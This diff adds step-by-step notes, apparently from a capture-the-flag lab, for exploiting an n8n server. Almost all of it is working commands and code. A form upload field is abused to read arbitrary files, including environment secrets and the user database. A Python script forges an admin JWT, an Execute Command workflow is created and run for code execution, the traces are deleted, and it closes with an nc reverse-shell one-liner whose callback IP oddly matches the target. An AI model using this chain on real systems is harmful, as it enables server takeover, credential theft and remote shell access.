@@ -1,0 +1,359 @@
+/rest/settings
+/api/v1/workflows
+/rest/login
+/webhook/
+/webhook/test
+
+python3 solve_n8n_21858.py http://10.130.138.197:5678 /form/file-processor
+==
+```
+{
+	"files":{
+	     "field-0":{
+		  "filepath":"/etc/hostname",
+		  "originalFilename":"test.txt",
+		  "mimetype":"text/plain"
+	      }
+	}
+}
+```
+```
+{"files":{"field-0":{"filepath":"/etc/hostname","originalFilename":"test.txt","mimetype":"text/plain"}}}
+```
+==
+```
+curl -sS -X POST \
+  'http://10.130.138.197:5678/form/file-processor' \
+  -H 'Content-Type: application/json' \
+  --data '{
+    "data": {},
+    "files": {
+      "field-0": {
+        "filepath": "/etc/hostname",
+        "originalFilename": "hostname.txt",
+        "mimetype": "text/plain"
+      }
+    }
+  }'
+```
+simpler:
+
+
+```
+{
+  "data": {},
+  "files": {
+    "field-0": {
+      "filepath": "/etc/hostname"
+    }
+  }
+}
+```
+=== Use Bash to build our function ==
+```
+TARGET='http://10.130.138.197:5678'
+FORM='/form/file-processor'
+```
+```
+read_file() {
+    local remote_path="$1"
+    local output_file="$2"
+
+    jq -nc --arg path "$remote_path" '{
+        data: {},
+        files: {
+            "field-0": {
+                filepath: $path,
+                originalFilename: "document.bin",
+                mimetype: "application/octet-stream",
+                size: 1048576
+            }
+        }
+    }' |
+    curl -sS --fail-with-body \
+        -X POST "$TARGET$FORM" \
+        -H 'Content-Type: application/json' \
+        --data-binary @- \
+        -o "$output_file"
+}
+```
+```
+read_file '/etc/hostname' hostname.txt
+```
+```
+read_file '/proc/self/environ' environ.bin
+```
+```
+CTF_HOME=/home/node
+JWT_SECRET=cve-2026-21858-lab-jwt-secret
+```
+
+== encryption algorithm ==
+
+```
+read_file \
+  '/usr/local/lib/node_modules/n8n/dist/auth/auth.service.js' \
+  auth.service.js
+```
+```
+read_file \
+  '/usr/local/lib/node_modules/n8n/dist/services/jwt.service.js' \
+  jwt.service.js
+
+```
+auth.service > createJWTHash  
+
+```
+read_file "$CTF_HOME/.n8n/config" config.json
+
+```
+read_file "$CTF_HOME/.n8n/database.sqlite" database.sqlite
+```
+```
+sqlite3 -readonly  database.sqlite "SELECT * FROM user"
+```
+```
+OWNER_ID=f52da01b-db1b-4ad5-97d0-2f2ee6332825
+OWNER_EMAIL=admin@lab.local
+OWNER_PASSWORD_HASH='$2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq'
+```
+
+```
+export OWNER_ID
+export OWNER_EMAIL
+export OWNER_PASSWORD_HASH
+export JWT_SECRET
+```
+==
+```
+AUTH_TOKEN=$(
+python3 - <<'PY'
+import os
+import json
+import time
+import hmac
+import base64
+import hashlib
+
+def b64url(value):
+    return base64.urlsafe_b64encode(value).decode().rstrip("=")
+
+owner_id = os.environ["OWNER_ID"]
+email = os.environ["OWNER_EMAIL"]
+password_hash = os.environ["OWNER_PASSWORD_HASH"]
+secret = os.environ["JWT_SECRET"]
+
+auth_hash = base64.b64encode(
+    hashlib.sha256(f"{email}:{password_hash}".encode()).digest()
+).decode()[:10]
+
+now = int(time.time())
+
+header = {
+    "alg": "HS256",
+    "typ": "JWT",
+}
+
+payload = {
+    "id": owner_id,
+    "hash": auth_hash,
+    "usedMfa": False,
+    "iat": now,
+    "exp": now + 3600,
+}
+
+encoded_header = b64url(
+    json.dumps(header, separators=(",", ":")).encode()
+)
+
+encoded_payload = b64url(
+    json.dumps(payload, separators=(",", ":")).encode()
+)
+
+signing_input = f"{encoded_header}.{encoded_payload}".encode()
+
+signature = hmac.new(
+    secret.encode(),
+    signing_input,
+    hashlib.sha256,
+).digest()
+
+print(
+    f"{encoded_header}.{encoded_payload}.{b64url(signature)}"
+)
+PY
+)
+```
+
+```
+curl -sS \
+    -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+    "$TARGET/rest/users" |
+    jq .
+```    
+   ==
+```
+python3 solve_n8n_21858.py http://10.130.138.197:5678 /form/file-processor   
+```
+
+==Create an Execute Command workflow==
+```
+COMMAND='id; pwd; find /home -maxdepth 4 -type f 2>/dev/null; true'
+```
+
+build workflow:
+```
+jq -nc --arg command "$COMMAND" '{
+    name: "ctf-user-flag-enum",
+    active: false,
+    nodes: [
+        {
+            parameters: {},
+            id: "manual-1",
+            name: "Start",
+            type: "n8n-nodes-base.manualTrigger",
+            typeVersion: 1,
+            position: [200, 300]
+        },
+        {
+            parameters: {
+                command: $command
+            },
+            id: "command-1",
+            name: "Command",
+            type: "n8n-nodes-base.executeCommand",
+            typeVersion: 1,
+            position: [450, 300]
+        }
+    ],
+    connections: {
+        Start: {
+            main: [[
+                {
+                    node: "Command",
+                    type: "main",
+                    index: 0
+                }
+            ]]
+        }
+    },
+    settings: {}
+}' > workflow.json
+```
+
+= ==Create it: ===
+```
+curl -sS \
+  -X POST "$TARGET/rest/workflows" \
+  -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data-binary @workflow.json \
+  -o create-response.json
+```
+```
+jq . create-response.json
+```
+
+Save its ID:
+
+```
+WORKFLOW_ID=$(
+  jq -r '.data.id' create-response.json
+)
+```
+
+
+
+===  Run the workflow ===
+
+```
+jq --arg id "$WORKFLOW_ID" \
+  '{workflowData:(. + {id:$id})}' \
+  workflow.json > run.json
+```
+== Execute it: ==
+```
+curl -sS \
+  -X POST "$TARGET/rest/workflows/$WORKFLOW_ID/run" \
+  -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+  -H 'Content-Type: application/json' \
+  --data-binary @run.json \
+  -o run-response.json
+```
+```
+jq . run-response.json
+```
+== Extract the execution ID: ==
+
+```
+EXECUTION_ID=$(
+  jq -r '.data.executionId' run-response.json
+)
+```
+
+
+==== Retrieve command output ===
+
+```
+curl -sS \
+  -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+  "$TARGET/rest/executions/$EXECUTION_ID" \
+  -o execution.json
+```
+n8n serializes execution data using a reference array. Locate the stdout reference:
+
+```
+STDOUT_REF=$(
+  jq -r '
+    .data.data
+    | fromjson
+    | .[]
+    | objects
+    | select(has("stdout"))
+    | .stdout
+  ' execution.json |
+  head -1
+)
+```
+  Resolve it:
+```
+jq -r --argjson ref "$STDOUT_REF" '
+  .data.data
+  | fromjson
+  | .[$ref]
+' execution.json | tee command-output.txt
+```
+```
+read_file "/home/node/flag-user-lfi.txt" user-flag.txt
+```
+== Remove the temporary workflow ==
+```
+  n8n requires workflows to be archived before deletion:
+
+  curl -sS \
+    -X POST \
+    -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+    "$TARGET/rest/workflows/$WORKFLOW_ID/archive" |
+    jq .
+```
+  Then delete it:
+```
+  curl -sS \
+    -X DELETE \
+    -H "Cookie: n8n-auth=$AUTH_TOKEN" \
+    "$TARGET/rest/workflows/$WORKFLOW_ID" |
+    jq .
+```
+== Automate the process
+```
+python3 solve_n8n_21858.py http://10.130.138.197:5678 /form/file-processor   
+```
+== reverse shell: ===
+```
+COMMAND="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.130.138.197 4444 >/tmp/f"
+```
+```
+python3 n8n_reverse_shell.py \
+  http://10.130.138.197:5678 \
+  /form/file-processor
+```
